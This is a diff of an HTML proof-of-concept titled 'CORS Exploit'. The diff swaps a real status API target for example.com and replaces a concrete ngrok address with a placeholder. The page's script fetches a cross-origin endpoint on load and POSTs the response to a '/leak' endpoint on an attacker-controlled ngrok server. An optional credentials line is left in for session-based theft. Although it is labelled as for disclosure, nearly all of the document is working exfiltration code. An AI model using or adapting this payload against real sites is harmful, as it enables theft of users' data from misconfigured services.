@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>CORS Exploit – Ably Status</title>
+  <title>CORS Exploit – Example Domain</title>
   <style>
     body {
       background-color: #000;
@@ -22,37 +22,45 @@
   </style>
 </head>
 <body>
-  <h1>🚨 Ably Status CORS PoC</h1>
-  <p>Fetching from <code>https://status.ably.com/api/v2/status.json</code> without credentials...</p>
+  <h1>🚨 CORS Exploit PoC</h1>
+  <p>Fetching from <code>https://example.com/api/v2/status.json</code> without credentials...</p>
   <textarea id="output">Loading...</textarea>
+
+  <!--
+    ⚠️ Note:
+    This proof-of-concept is for educational and responsible disclosure purposes only.
+    Replace example.com with the actual vulnerable domain.
+    Replace the exfiltration URL with your own controlled server (e.g. ngrok).
+  -->
 
   <script>
     window.onload = () => {
-      fetch("https://status.ably.com/api/v2/status.json", {
+      fetch("https://example.com/api/v2/status.json", {
         method: "GET"
-        // credentials: "include"  <-- Removed to avoid CORS credential error
+        // credentials: "include"  // Uncomment if testing session-based CORS
       })
       .then(res => res.text())
       .then(data => {
         alert("✅ Response received!");
         document.getElementById("output").value = data;
 
-        // Exfiltrate the data to your ngrok server
-        fetch("https://812c-152-58-177-169.ngrok-free.app/leak", {
+        // 📤 Exfiltrate to your server
+        fetch("https://your-ngrok-server.ngrok-free.app/leak", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ leaked: data })
         })
         .catch(err => {
-          console.error("Error exfiltrating data:", err);
+          console.error("❌ Exfiltration failed:", err);
         });
       })
       .catch(err => {
-        alert("❌ Error: " + err);
+        alert("❌ Fetch error: " + err);
         document.getElementById("output").value = "Error:\n" + err;
       });
     };
   </script>
 </body>
 </html>
+
 
